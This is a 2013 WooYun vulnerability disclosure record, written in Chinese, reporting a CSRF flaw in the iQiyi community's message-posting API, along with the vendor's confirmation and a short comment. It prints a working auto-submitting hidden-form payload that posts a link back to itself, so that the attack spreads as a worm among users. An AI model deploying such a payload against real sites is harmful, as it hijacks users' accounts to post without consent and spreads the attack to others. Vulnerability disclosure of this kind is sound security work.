{"id": 8716, "wybug_id": "wooyun-2013-036391", "wybug_title": "奇艺社区CSRF可构造蠕虫", "wybug_corp": "奇艺", "wybug_author": "LaiX", "wybug_date": "2013-09-10 13:46", "wybug_open_date": "2013-10-25 13:47", "wybug_type": "CSRF", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["漏洞利用", "利用技巧", "类型应用", "蠕虫"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-09-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-09-10：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-09-20：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-09-30：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-10-10：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-10-25：\t细节向公众公开  简要描述： 在发展业务的同时也注意以下CSRF撒 详细说明：  问题应用：\nhttp://t.iqiyi.com/home\n   漏洞证明：  发表\"奇谈\"的时候抓到了这个地址：\nhttp://t.iqiyi.com/api/feed/addChat.php\n没有token或者其他的随机参数。POST参数中：\n<input type=\"hidden\" name=\"requestMethod\" value=\"POST\"><input type=\"hidden\" name=\"requestURL\" value=\"http\" value=\"//t.iqiyi.com/api/feed/addChat.php\"><input type=\"hidden\" name=\"notsync\" value=\"\"><input type=\"hidden\" name=\"categoryid\" value=\"\"><input type=\"hidden\" name=\"picid\" value=\"\"><input type=\"hidden\" name=\"txt\" value=\"test\"><input type=\"hidden\" name=\"tvid\" value=\"0\"><input type=\"hidden\" name=\"cb\" value=\"qitan_response_data\"><input type=\"submit\" value=\"ok\">\n构造一个payload:(http://cnhk.ml/qiyi/send.html)\n<meta http-equiv=\"content-type\" content=\"text/html;charset=utf-8\"><h1>正在跳转...</h1><iframe id=\"test_iframe\" style='display:none'></iframe><script>function CSRF(){  //    test_iframe.document.write(\"<form id='test_form' action='http://t.iqiyi.com/api/feed/addChat.php' method='post' >\"      \t                        +\"<input type='hidden' name='requestMethod' value='POST'>\"      \t            \t        +\"<input type='hidden' name='requestURL' value='http' value='//t.iqiyi.com/api/feed/addChat.php'>\"      \t            \t        +\"<input type='hidden' name='notsync' value=''>\"      \t            \t        +\"<input type='hidden' name='categoryid' value=''>\"      \t           \t            +\"<input type='hidden' name='picid' value=''>\"      \t           \t            +\"<input type='hidden' name='txt' value='推荐一个好东西 http://cnhk.ml/qiyi/send.html'>\"      \t           \t            +\"<input type='hidden' name='tvid' value='0'>\"      \t          \t            +\"<input type='hidden' name='cb' value='qitan_response_data'>\"      \t          \t            +\"<input type='submit' value='ok'>\"      \t          \t            +\"</form>\"      \t            \t        +\"<script>document.getElementById('test_form').submit();<\\/script>\"      \t             )}CSRF();window.setTimeout(\"window.location.href='http://threejs.org/'\", 5000)//延迟二秒后跳转到指定网页</script>\n当用户访问之后：\n\n然后其他的用户看到点击之后继续发消息，构成蠕虫攻击...   修复方案：  控制访问来源   版权声明：转载请注明来源 LaiX@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2013-09-10 14:02 厂商回复： 谢谢提供！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-10-25 14:09 |    \t\tbig、face \t\t\t( 普通白帽子  |\t\t\t        Rank:144 漏洞数:36        | |上天请赐我一个洞|想要一件乌云衣服|)\t\t \n  彪悍！    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}